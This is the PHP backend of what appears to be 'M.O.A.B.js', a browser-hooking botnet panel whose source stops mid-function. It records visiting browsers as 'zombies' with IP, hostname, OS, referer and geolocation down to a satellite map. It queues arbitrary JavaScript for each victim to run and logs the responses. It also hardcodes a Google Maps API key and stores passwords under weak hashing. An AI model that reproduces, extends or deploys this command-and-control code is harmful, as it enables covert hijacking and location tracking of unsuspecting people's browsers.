<?php
/*****************************************************
/*****************************************************
##################### M.O.A.B.js #####################
################# Magic Of Ajax Bots #################
######### Do you want to see a magic trick? ##########
######################################################
                             _
                            | \
                           _|  \______________________________________
                          - ______        ________________          \_`,
                        -(_______            -=    -=        USAF       )
                                 `--------=============----------------`


				          /|,
				         / /,-/
				        .!//_/
				       / M |
				      /_O /
				     /:A`/
				    /'B`/
				    | ,'
				    '

		     _.-^^---....,,--       
		 _--                  --_  
		<                        >)
		|                         | 
		 \._                   _./  
		    ```--. . , ; .--'''       
		          | |   |             
		       .-=||  | |=-.   
		       `-=#$%&%$#=-'   
		          | ;  :|     
		 _____.,-#%&$@%#&#~,._____
******************************************************
*****************************************************/


//Require config file
require_once('config.php');
//Require recaptcha file 
require_once('recaptcha/recaptchalib.php');

function log_mysql_error($errormessage, $code, $file, $line, $usermessage, $exit = False) {
	$timestamp = date("D M d H:i:s Y");
	$clientip = $_SERVER['REMOTE_ADDR'];
	$line = "[$timestamp] [client $clientip] Exception code: $code, Exception message: $errormessage, File: $file, Line: $line\n";
	file_put_contents("logs/error.log", $line, FILE_APPEND);
	echo "$usermessage";
	if($exit) {
		exit;
	}
}

//Start new PDO
try {
	$pdo = new PDO('mysql:host='.$mysql_host.';dbname='.$mysql_database.';charset=utf8', 
		$mysql_username, 
		$mysql_password, 
		array(PDO::ATTR_EMULATE_PREPARES => false, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION)
	);
} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "An error has occured while connecting to the database!", True);
}
function gen_salt($length) {
	$characters = array("a","A","b","B","c","C","d","D","e","E","f","F","g","G","h","H","i","I","j","J","k","K","l","L","m","M","n","N","o","O","p","P","q","Q","r","R","s","S","t","T","u","U","v","V","w","W","x","X","y","Y","z","Z","1","2","3","4","5","6","7","8","9");
	$i = 0;
	$salt = "";
	while($i < $length) {
		$arrand = array_rand($characters, 1);
		$salt .= $characters[$arrand];
		$i++;
	}
	return $salt;
}

function encrypt($password, $salt) {
	return sha1(md5(sha1($password)).md5(sha1($salt)));
}

function get_uptime($timestamp) {
	$current = date("D M d H:i:s Y");
	$startdate = new DateTime($timestamp);
	$uptime = $startdate->diff(new DateTime($current));
	$days = $uptime->d;
	$hours = $uptime->h;
	$minutes = $uptime->i;
	$seconds = $uptime->s;
	if($minutes == 0) {
		$format = "$seconds seconds";
	} elseif($minutes > 0) {
		$format = $minutes."M ".$seconds."S";
	} elseif($hours > 0) {
		$format = $hours."H ".$minutes."M ".$seconds."S";
	} elseif($days > 0) {
		$format = $days."D ".$hours."H ".$minutes."M ".$seconds."S";
	}
	return $format;
}

function getOS($useragent) {
	$os_platform = "Unknown OS Platform";
    $os_array = array(
                    '/windows nt 6.3/i'     =>  'Windows 8.1',
                    '/windows nt 6.2/i'     =>  'Windows 8',
                    '/windows nt 6.1/i'     =>  'Windows 7',
                    '/windows nt 6.0/i'     =>  'Windows Vista',
                    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                    '/windows nt 5.1/i'     =>  'Windows XP',
                    '/windows xp/i'         =>  'Windows XP',
                    '/windows nt 5.0/i'     =>  'Windows 2000',
                    '/windows me/i'         =>  'Windows ME',
                    '/win98/i'              =>  'Windows 98',
                    '/win95/i'              =>  'Windows 95',
                    '/win16/i'              =>  'Windows 3.11',
                    '/macintosh|mac os x/i' =>  'Mac OS X',
                    '/mac_powerpc/i'        =>  'Mac OS 9',
                    '/linux/i'              =>  'Linux',
                    '/ubuntu/i'             =>  'Ubuntu',
                    '/iphone/i'             =>  'iPhone',
                    '/ipod/i'               =>  'iPod',
                    '/ipad/i'               =>  'iPad',
                    '/android/i'            =>  'Android',
                    '/blackberry/i'         =>  'BlackBerry',
                    '/webos/i'              =>  'Mobile'
                );
	foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $useragent)) {
            $os_platform    =   $value;
        }
	}   
    return $os_platform;
}

function send_registration_email($email, $hash, $user) {
global $sitename;
global $admin_email;
global $admin_contacts;
global $sitepath;
	$domain = $_SERVER['HTTP_HOST'];
	$emailtimestamp = date("D M d H:i:s Y");
	$subject = "$sitename: Registration Verification";
	$message = "<h1>$sitename</h1>";
	$message .= "$user, <br><br>Thank you for registering an account with us! Before you can login you must verify your email. Click the link below to verify your email and continue logging in!<br>";
	$message .= "<br><a href='http://$domain$sitepath/verify.php?hash=$hash'>http://$domain$sitepath/verify.php?hash=$hash</a><br>";
	$message .= "<br>If you have any issues with verifying your account you can contact the administrator at the following places:<br>";
	foreach($admin_contacts as $place => $detail) {
		$message .= "$place: $detail<br>";
	}
	$message .= "<br>Email Timestamp: [$emailtimestamp]";
	$headers = "From:$admin_email \r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
	if(mail($email, $subject, $message, $headers)) {
		return true;
	} else {
		return false;
	}
}

function register($username, $password, $password2, $email, $recaptcha, $recaptcha2) {
	global $pdo;
	global $privatekey;
	$ip = $_SERVER["REMOTE_ADDR"];
	if(empty($username) or empty($password) or empty($password2) or empty($email)) {
		echo "All fields must be filled out!";
	} else {
		$chk = $pdo->prepare("SELECT * FROM users WHERE username=:username");
		$chk->bindValue(':username', $username, PDO::PARAM_STR);
		$chk->execute();
		$count = $chk->rowCount();
		if($count > 0) {
			echo "The username you chose already exists!";
		} else {
			$cip = $pdo->prepare("SELECT * FROM users WHERE ip=:ip");
			$cip->bindValue(':ip', $ip, PDO::PARAM_STR);
			$cip->execute();
			$count = $cip->rowCount();
			if($count > 0) {
				echo "You already have an account registered!";
			} else {
				if($password != $password2) {
					echo "The passwords you entered do not match!";
				} else {
					if(!filter_var($email, FILTER_VALIDATE_EMAIL)) {
						echo "You must enter a valid email!";
					} else {
						$resp = recaptcha_check_answer($privatekey, $ip, $recaptcha, $recaptcha2);
						if(!$resp->is_valid) {
							echo "The answer to the captcha was incorrect!";
						} else {
							$salt = gen_salt("40");
							try {
								$ins = $pdo->prepare("INSERT INTO users (username, email, ip, password, salt, unique_id) VALUES (:username, :email, :ip, :password, :salt, :unique_id)");
								$ins->execute(array(':username' => $username, ':email' => $email, ':ip' => $ip, ':password' => encrypt($password, $salt), ':salt' => $salt, ':unique_id' => gen_salt(32)));
								$affrows = $ins->rowCount();
								$random_string = md5(gen_salt("40"));
								if(send_registration_email($email, $random_string, $username)) {
									$lastid = $pdo->lastInsertId();
									$inse = $pdo->prepare("INSERT INTO email_verify (userid, hash) VALUES (:userid, :hash)");
									$inse->execute(array(':userid' => $lastid, ':hash' => $random_string));
									echo "Your account has been registered!";
								} else {
									echo "Registration email was not sent!<br>Contact the admin to verify your account.";
								}
							} catch(PDOException $e) {
								$emessage = $e->getMessage();
								$ecode = $e->getCode();
								$efile = $e->getFile();
								$eline = $e->getLine();
								log_mysql_error($emessage, $ecode, $efile, $eline, "An error has occured while registering account!", False);
							}
						}
					}
				}
			}
		}
	}	
}

function login($username, $password, $rememberme, $redirect) {
global $pdo;
global $auth_string;
global $auth_string2;

	$fetch = $pdo->prepare("SELECT * FROM users WHERE username=:username");
	$fetch->bindValue(':username', $username, PDO::PARAM_STR);
	$fetch->execute();
	$count = $fetch->rowCount();
	$rows = $fetch->fetchAll(PDO::FETCH_ASSOC);
	if($count > 0) {
		foreach($rows as $r) {
			$userid = $r['userid'];
			$dbpassword = $r['password'];
			$salt = $r['salt'];
		}
		if(encrypt($password, $salt) == $dbpassword) {
			$check = $pdo->prepare("SELECT * FROM email_verify WHERE userid=:userid");
			$check->bindValue(':userid', $userid, PDO::PARAM_STR);
			$check->execute();
			$checkcount = $check->rowCount();
			if($checkcount == 0) {
				@session_start();
				$_SESSION['userid'] = $userid;
				$cookievalue = sha1(md5($auth_string).$username.md5($auth_string2));
				if($rememberme == "true") {
					setcookie("usersession", $cookievalue, 0, "/");
				} else {
					setcookie("usersession", $cookievalue, time()+3600, "/");
				}
				echo "<script>window.location = './index.php';</script>";
			} else {
				echo "Your account has not been verified!<br>We sent you an email verification.<br>Please verify your email before you login.";
			}
		} else {
			echo "Password is incorrect!";
		}
	} else {
		echo "Username does not exist!";
	}
}

function logout() {
	session_start();
	session_destroy();
	setcookie("usersession", "", time() - 3600);
	echo "<script>window.location = '../index.php';</script>";
}

function get_userid() {
	@session_start();
	return @$_SESSION['userid'];
}

function get_username($userid) {
global $pdo;
	try {
		$get = $pdo->prepare("SELECT * FROM users WHERE userid=:userid");
		$get->bindValue(':userid', $userid, PDO::PARAM_STR);
		$get->execute();
		return $get->fetchColumn(1);
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function get_unique_id($userid) {
global $pdo;
	try {
		$get = $pdo->prepare("SELECT * FROM users WHERE userid=:userid");
		$get->bindValue(':userid', $userid, PDO::PARAM_STR);
		$get->execute();
		return $get->fetchColumn(6);
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function check_if_online($uid, $zid) {
global $pdo;
global $zombieexpiretime;
	try {
		$get = $pdo->prepare("SELECT * FROM online_zombies WHERE unique_id=:uid AND victim_id=:zid AND online_status=1");
		$get->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get->bindValue(':zid', $zid, PDO::PARAM_STR);
		$get->execute();
		$count = $get->rowCount();
		if($count > 0) {
			//Here we need to confirm that the zombie is still actually online
			//We'll compare the last handshake to the current time
			//If the difference is 10 seconds or greater we assume zombie is dead and make it offline
			$row = $get->fetch(PDO::FETCH_ASSOC);
			$currentts = strtotime(date("Y-m-d H:i:s"));
			$lasths = strtotime($row['last_handshake']);
			$difference = abs($lasths-$currentts);
			if($difference > $zombieexpiretime) {
				make_zombie_offline($uid, $zid);
				return false;
			} else {
				return true;
			}
		} else {
			return false;
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function check_zombie_status($uid) {
global $pdo;
	try {
		$ipaddress = $_SERVER['REMOTE_ADDR'];
		$get = $pdo->prepare("SELECT * FROM online_zombies WHERE unique_id=:uid AND ipaddress=:ip");
		$get->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get->bindValue(':ip', $ipaddress, PDO::PARAM_STR);
		$get->execute();
		$count = $get->rowCount();
		if($count > 0) {
			$get = $pdo->prepare("SELECT * FROM online_zombies WHERE unique_id=:uid AND ipaddress=:ip");
			$get->bindValue(':uid', $uid, PDO::PARAM_STR);
			$get->bindValue(':ip', $ipaddress, PDO::PARAM_STR);
			$get->execute();
			$row = $get->fetch(PDO::FETCH_ASSOC);
			$json = array('status' => 1, 'zid' => $row['victim_id']);
			echo json_encode($json);
		} else {
			$json = array('status' => 0);
			echo json_encode($json);
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function get_online_zombies($uid) {
global $pdo;
	try {
		$get = $pdo->prepare("SELECT * FROM online_zombies WHERE unique_id=:uid AND online_status=1");
		$get2 = $pdo->prepare("SELECT COUNT(DISTINCT ipaddress) FROM online_zombies WHERE unique_id=:uid");
		$get->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get2->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get->execute();
		$get2->execute();
		$count = $get->rowCount();
		$rows = $get->fetchAll(PDO::FETCH_ASSOC);
		if($count > 0) {
			echo "<div id='zombie_stats'>
					<div class='col-xs-6 col-sm-3 placeholder' style='width: 50%;'>
              			<div class='statsCircle'>
                			<span>".number_format($count)."</span>
              			</div>
              			<h4>Online Zombies</h4>
            		</div>
            		<div class='col-xs-6 col-sm-3 placeholder' style='width: 50%;'>
              			<div class='statsCircle'>
                			<span>".number_format($get2->fetchColumn())."</span>
              			</div>
              			<h4>Unique Link Hits</h4>
           			</div>
           			</div>
           			</div>
           			<h2 class='sub-header'>Online Zombies</h2>
           			<div id='online_zombies'>
					<table class='table table-striped'>
						<thead>
							<tr>
								<th>IP</th>
								<th>Referer</th>
								<th>Location</th>
								<th>PC Name</th>
								<th>OS</th>
								<th>Uptime</th>
								<th>Last Handshake</th>
							</tr>
						</thead>
						<tbody>";
			foreach($rows as $row) {
				if(check_if_online($uid, $row['victim_id'])) {
					$refhost = parse_url($row['referer']);
					echo "<tr>
							<td><a href='./control_zombie.php?zid=".$row['victim_id']."'>".$row['ipaddress']."</a></td>
							<td><a onclick=\"generate_modal('Zombie Referer', '".$row['referer']."', 'Close', 'return false;');\">".$refhost['host']."</a></td>
							<td>".$row['location']."</td>
							<td>".$row['pc_name']."</td>
							<td>".$row['os']."</td>
							<td>".get_uptime($row['timestamp'])."</td>
							<td>".$row['last_handshake']."</td>
					</tr>";
				}
			}
			echo "</tbody></table></div></div></div>";
		} else {
			echo "<div id='zombie_stats'>
					<div class='col-xs-6 col-sm-3 placeholder' style='width: 50%;'>
              			<div class='statsCircle'>
                			<span>".number_format($count)."</span>
              			</div>
              			<h4>Online Zombies</h4>
            		</div>
            		<div class='col-xs-6 col-sm-3 placeholder' style='width: 50%;'>
              			<div class='statsCircle'>
                			<span>".number_format($get2->fetchColumn())."</span>
              			</div>
              			<h4>Unique Link Hits</h4>
           			</div>
				</div>
			</div>
				<div id='online_zombies'><h2 class='sub-header'>No Zombies Online!</h2></div>";
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function get_zombie_logs($uid, $zid) {
global $pdo;
	try {
		$get = $pdo->prepare("SELECT * FROM zombie_logs WHERE uid=:uid AND zid=:zid ORDER BY id ASC");
		$get->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get->bindValue(':zid', $zid, PDO::PARAM_STR);
		$get->execute();
		$count = $get->rowCount();
		$rows = $get->fetchAll(PDO::FETCH_ASSOC);
		if($count > 0) {
			echo "<h2 class='sub-header'>Zombie Command/Response Logs</h2>
				<div id='zombie_logs'>
					<table class='table table-striped'>
						<tr>
							<th>Timestamp</th>
							<th>Command</th>
							<th>Response</th>
						</tr>";
			foreach($rows as $row) {
				echo "<tr>
						<td>".$row['timestamp']."</td>
						<td>".$row['command']."</td>
						<td>".$row['response']."</td>
					</tr>";
			}
			echo "</table></div>";
		} else {
			echo "<div id='zombie_logs'><center>No zombie logs!</center></div>";
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function get_zombie_info($zid) {
global $pdo;
	try {
		$get = $pdo->prepare("SELECT * FROM online_zombies WHERE victim_id=:zid");
		$get->bindValue(':zid', $zid, PDO::PARAM_STR);
		$get->execute();
		$count = $get->rowCount();
		$row = $get->fetch(PDO::FETCH_ASSOC);
		if($count > 0) {
			return $row;
		} else {
			return false;
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function make_zombie_online($uid, $vid) {
global $pdo;
	try {
		$ipaddress = $_SERVER['REMOTE_ADDR'];
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$ref = $_SERVER['HTTP_REFERER'];
		$timestamp = date("Y-m-d H:i:s");
		$pcname = gethostbyaddr($ipaddress);
		$location = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ipaddress), true);
		$os = getOS($useragent);
		if($location['geoplugin_countryCode'] == null) {$location = "Unknown";} else {$location = $location['geoplugin_city'] . ", " . $location['geoplugin_region'];}
		
		$check = $pdo->prepare("SELECT * FROM online_zombies WHERE unique_id=:uid AND victim_id=:vid");
		$check->bindValue(':uid', $uid, PDO::PARAM_STR);
		$check->bindValue(':vid', $vid, PDO::PARAM_STR);
		$check->execute();
		$count = $check->rowCount();
		
		if($count > 0) {
			$timestamp = date("Y-m-d H:i:s");
			$update = $pdo->prepare("UPDATE online_zombies SET online_status=1, timestamp=:timestamp, last_handshake=:lasths, referer=:ref WHERE unique_id=:uid AND victim_id=:vid");
			$update->bindValue(':uid', $uid, PDO::PARAM_STR);
			$update->bindValue(':vid', $vid, PDO::PARAM_STR);
			$update->bindValue(':timestamp', $timestamp, PDO::PARAM_STR);
			$update->bindValue(':lasths', $timestamp, PDO::PARAM_STR);
			$update->bindValue(':ref', $ref, PDO::PARAM_STR);
			$update->execute();
		} else {
			$insert = $pdo->prepare("INSERT INTO online_zombies (unique_id, victim_id, ipaddress, user_agent, timestamp, pc_name, location, os, online_status, last_handshake, referer) VALUES (:uid, :vid, :ip, :ua, :ts, :pcname, :location, :os, 1, :lasths, :ref)");
			$insert->bindValue(':uid', $uid, PDO::PARAM_STR);
			$insert->bindValue(':vid', $vid, PDO::PARAM_STR);
			$insert->bindValue(':ip', $ipaddress, PDO::PARAM_STR);
			$insert->bindValue(':ua', $useragent, PDO::PARAM_STR);
			$insert->bindValue(':ts', $timestamp, PDO::PARAM_STR);
			$insert->bindValue(':pcname', $pcname, PDO::PARAM_STR);
			$insert->bindValue(':location', $location, PDO::PARAM_STR);
			$insert->bindValue(':os', $os, PDO::PARAM_STR);
			$insert->bindValue(':lasths', $timestamp, PDO::PARAM_STR);
			$insert->bindValue(':ref', $ref, PDO::PARAM_STR);
			$insert->execute();
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function create_zombie_command($uid, $zid, $javascriptcode) {
global $pdo;
	try {
		$insert = $pdo->prepare("INSERT INTO zombie_commands (uid, zid, js) VALUES (:uid, :zid, :js)");
		$insert->bindValue(':uid', $uid, PDO::PARAM_STR);
		$insert->bindValue(':zid', $zid, PDO::PARAM_STR);
		$insert->bindValue(':js', $javascriptcode, PDO::PARAM_STR);
		$insert->execute();
		return true;
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
		return false;
	}
}

function create_zombie_log($uid, $zid, $command, $response) {
global $pdo;
	try {
		$timestamp = date("D M d H:i:s Y");
		$insert = $pdo->prepare("INSERT INTO zombie_logs (uid, zid, command, response, timestamp) VALUES (:uid, :zid, :command, :response, :timestamp)");
		$insert->bindValue(':uid', $uid, PDO::PARAM_STR);
		$insert->bindValue(':zid', $zid, PDO::PARAM_STR);
		$insert->bindValue(':command', $command, PDO::PARAM_STR);
		$insert->bindValue(':response', $response, PDO::PARAM_STR);
		$insert->bindValue(':timestamp', $timestamp, PDO::PARAM_STR);
		$insert->execute();
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function check_for_commands($uid, $zid) {
global $pdo;
	try {
		$get = $pdo->prepare("SELECT * FROM zombie_commands WHERE zid=:zid AND uid=:uid");
		$get->bindValue(':zid', $zid, PDO::PARAM_STR);
		$get->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get->execute();
		$count = $get->rowCount();
		$row = $get->fetch(PDO::FETCH_ASSOC);
		if($count > 0) {
			$json = array(
						'zid' => $zid,
						'js' => $row['js']
					);
			$json = json_encode($json);
			return $json;
		} else {
			return false;
		}
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function delete_command($uid, $zid) {
global $pdo;
	try {
		$get = $pdo->prepare("DELETE FROM zombie_commands WHERE zid=:zid AND uid=:uid");
		$get->bindValue(':zid', $zid, PDO::PARAM_STR);
		$get->bindValue(':uid', $uid, PDO::PARAM_STR);
		$get->execute();
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function make_zombie_offline($uid, $vid) {
global $pdo;
	try {
		$update = $pdo->prepare("UPDATE online_zombies SET online_status=0 WHERE unique_id=:uid AND victim_id=:vid");
		$update->bindValue(':uid', $uid, PDO::PARAM_STR);
		$update->bindValue(':vid', $vid, PDO::PARAM_STR);
		$update->execute();
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

function update_last_handshake($uid, $zid, $timestamp) {
global $pdo;
	try {
		$update = $pdo->prepare("UPDATE online_zombies SET last_handshake=:time WHERE unique_id=:uid AND victim_id=:zid");
		$update->bindValue(':uid', $uid, PDO::PARAM_STR);
		$update->bindValue(':zid', $zid, PDO::PARAM_STR);
		$update->bindValue(':time', $timestamp, PDO::PARAM_STR);
		$update->execute();
	} catch(PDOException $e) {
		$emessage = $e->getMessage();
		$ecode = $e->getCode();
		$efile = $e->getFile();
		$eline = $e->getLine();
		log_mysql_error($emessage, $ecode, $efile, $eline, "Ooops something went wrong!", True);
	}
}

//This will parse a JSON array from geoplugin.net and return an HTML table to echo 
function location_information($ip){
	$locatinfo = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
	if($locatinfo['geoplugin_countryCode'] == null) {
		$locathtml = "Unknown<br><br>";
		return $locathtml;
	} else {
		$locathtml = "<table class='table table-striped'>";
		$locathtml .= "<tr>";
		$locathtml .= "<th colspan='3' style='text-align: center;'>Location Information</th>";
		$locathtml .= "</tr>";
		$locathtml .= "<tr>";
		$locathtml .= "<td>City: ".$locatinfo['geoplugin_city']."</td>";
		$locathtml .= "<td>State: ".$locatinfo['geoplugin_regionCode']." / ".$locatinfo['geoplugin_regionName']."</td>";
		$locathtml .= "<td>Area Code: ".$locatinfo['geoplugin_areaCode']."</td>";
		$locathtml .= "</tr><tr>";
		$locathtml .= "<td>Country: ".$locatinfo['geoplugin_countryCode']." / ".$locatinfo['geoplugin_countryName']."</td>";
		$locathtml .= "<td>Latitude: ".$locatinfo['geoplugin_latitude']."</td>";
		$locathtml .= "<td>Longitude: ".$locatinfo['geoplugin_longitude']."</td>";
		$locathtml .= "</tr></table>";
		$locathtml .= "<iframe src='https://www.google.com/maps/embed/v1/view?key=AIzaSyB20WR3R8pL7thE4Bd9mpgDa6nHdOLVmgQ&center=".$locatinfo['geoplugin_latitude'].",".$locatinfo['geoplugin_longitude']."&zoom=15&maptype=satellite' width='100%' height='50%'></iframe><br><br>";
		return $locathtml;
	}
}

function is_admin($userid) {
	global $pdo;
	$getid = $pdo->prepare("SELECT * FROM administrators WHERE userid=:userid");
	$getid->bindValue(':userid', $userid, PDO::PARAM_STR);
	$getid->execute();
	$rowcount = $getid->rowCount();
	if($rowcount != 0) {
		return true;
	} else {
		return false;
	}
}

function user_logged_in() {
global $auth_string;
global $auth_string2;

	$usercookie = @$_COOKIE['usersession'];
	$usersessionhash = sha1(md5($auth_string).get_username(get_userid()).md5($auth_string2));
	if($usercookie == $usersessionhash) {
		return True;
	} else {
		return False;
	}
}

function display_random_ascii(){
	foreach(glob('./styles/ascii/*.txt') as $file){
		$asciifiles[] = $file;
	}
	$randasciifile = file_get_contents($asciifiles[array_rand($asciifiles)]);
	echo "<div class='ascii'><pre>";
	echo $randasciifile;
	echo "</pre></div>";
}

function display_navbar($current) {
global $nav;
global $secondarynav;
global $loggedinmenu;
global $sitename;
global $sitelink;
global $publickey;

echo <<<html
	<div class="topbar" id="topbar">
    <div class="fill">
        <div class="container">
            <a class="brand" href="$sitelink">$sitename</a>
            <ul class="nav">
html;
                foreach($nav as $title => $link) {
					if($title == $current) {
						echo '<li class="active"><a href="'.$link.'">'.$title.'</a></li>';
					} else {
						echo '<li><a href="'.$link.'">'.$title.'</a></li>';
					}
				}
echo <<<html
            </ul>
            <ul class="nav secondary-nav">
html;
				if(user_logged_in()) {
					$username = get_username(get_userid());
					echo '
					<li class="menu">
						<a href="#" class="menu">'.$username.'</a>
						<ul class="menu-dropdown">';
							foreach($loggedinmenu as $limtitle => $limlink) {
								if($limtitle == "divider") {
									echo '<li class="divider"></li>';
								} else {
									echo '<li><a href="'.$limlink.'">'.$limtitle.'</a></li>';
								}
							}
						echo '</ul>
					</li>';
				} else {
					foreach($secondarynav as $stitle => $scallback) {
						echo '<li><a onclick="'.$scallback.'">'.$stitle.'</a></li>';
					}
				}
echo <<<html
            </ul>
        </div>
    </div>
</div>
<script src="./styles/jquery/jquery-1.7.1.min.js"></script>
<script src="./styles/bootstrap/bootstrap-dropdown.js"></script>
<script src="./styles/bootstrap/bootstrap-modal.js"></script>
<script type="text/javascript" src="./styles/jquery/jquery-ui.js"></script>
<script type="text/javascript" src="./styles/jquery/jquery.js"></script>
<script>
    $(window).load(function(){
        $('#topbar').dropdown();
    });
</script>
<div id="backdrop"></div>
<div id="loginposi">
	<div id="login">
		<div id="message"></div>
		<div id="loginheader"><center>Login</center></div>
			<br>
			<form onsubmit="return login_ajax();">
				<center>
					<table>
						<tr>
							<td>
								Username<br>
								<input type="text" name="username" id="username" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Password<br>
								<input type="password" name="password" id="password" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Remember Me <input type="checkbox" name="rememberme" id="rememberme">
							</td>
						</tr>
						<tr>
							<td>
								<input type="submit" name="login" value="Login" class="styledButton">
							</td>
						</tr>
					</table>
				</center>
			</form>
	</div>
</div>

<div id="registerposi">
	<div id="login">
		<div id="rmessage"></div>
		<div id="loginheader"><center>Register</center></div>
			<br>
			<form onsubmit="return register_ajax();">
				<center>
					<table>
						<tr>
							<td>
								Username<br>
								<input type="text" name="username" id="rusername" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Password<br>
								<input type="password" name="password" id="rpassword" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Re-Enter Password<br>
								<input type="password" name="password2" id="password2" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
								Email<br>
								<input type="text" name="email" id="email" class="styledInput">
							</td>
						</tr>
						<tr>
							<td>
html;
echo recaptcha_get_html($publickey);
echo '</td>
						</tr>
						<tr>
							<td>
								<input type="submit" name="register" value="Register" class="styledButton">
								<span id="loadimage"></span>
							</td>
						</tr>
					</table>
				</center>
			</form>
	</div>
</div>';
}

//Chat Box Functions
function refresh_chat() {
	global $pdo;
	if(!user_logged_in()) {
		echo "You must be logged in to use the chat box! You can register <a onclick=\"fade_background('#registerposi');\">here</a> or login <a onclick=\"fade_background('#loginposi');\">here</a>.";
	} else {
		$getmes = $pdo->query("SELECT * FROM chat_messages ORDER BY id DESC LIMIT 0, 30");
		foreach($getmes as $rows) {
			echo "[".$rows['date']."] ".$rows['username'].": <font color='#c8c8c8'>".$rows['message']."</font><br>";
		}
	}
}
function send_notice($notice) {
	global $pdo;
	$insno = $pdo->prepare("INSERT INTO chat_messages (date, username, message) VALUES (:date, :username, :notice)");
	$insno->execute(array(':date' => "NOTICE", ':username' => get_username(get_userid()), ':notice' => $notice));
	exit;
}
function send_message($message) {
	global $pdo;
	$date = new DateTime();
	$date2 = $date->format('Y-m-d H:i');
	if(user_logged_in()) {
		if($message == '/partymode' && is_admin(get_userid())) {
			$notice = "Party mode has been enabled! <script>if(typeof song == 'undefined') {var inter = setInterval(function(){change_box_color()},500); var song = $.get('./ajax/music.php', function(data) {window.music = new Sound(data,100,true); window.music.start(); delete partystatus;}); }</script>";
			$upd = $pdo->prepare("UPDATE chat_messages SET message='Party mode has been disabled!' WHERE username=:username AND message LIKE :like");
			$upd->execute(array(':username' => get_username(get_userid()), ':like' => "Party mode has been disabled!%"));
			send_notice($notice);
		} elseif($message == '/endpartymode' && is_admin(get_userid())) {
			$upd = $pdo->prepare("UPDATE chat_messages SET message='Party mode has been enabled!' WHERE username=:username AND message LIKE :like");
			$upd->execute(array(':username' => get_username(get_userid()), ':like' => "Party mode has been enabled!%"));
			$notice = "Party mode has been disabled! <script>if(typeof partystatus == 'undefined') {normal_shadow(); clearInterval(inter);  window.music.stop(); var partystatus = 'done'; delete song;}</script>";
			send_notice($notice);
		} elseif($message == '/clear' && is_admin(get_userid())) {
			$cl = $pdo->prepare("TRUNCATE chat_messages");
			$cl->execute();
			send_notice("The chat box has been cleared!");
		} else {
			$message = htmlspecialchars($message);
		}
		$insmes = $pdo->prepare("INSERT INTO chat_messages (date, username, message) VALUES (:date, :username, :message)");
		$insmes->execute(array(':date' => $date2, ':username' => get_username(get_userid()), ':message' => $message));
	}
}

function display_bootstrap($current, $sidebararray) {
global $nav;
global $loggedinmenu;
global $sitename;
global $sitelink;
global $publickey;

	echo <<<html
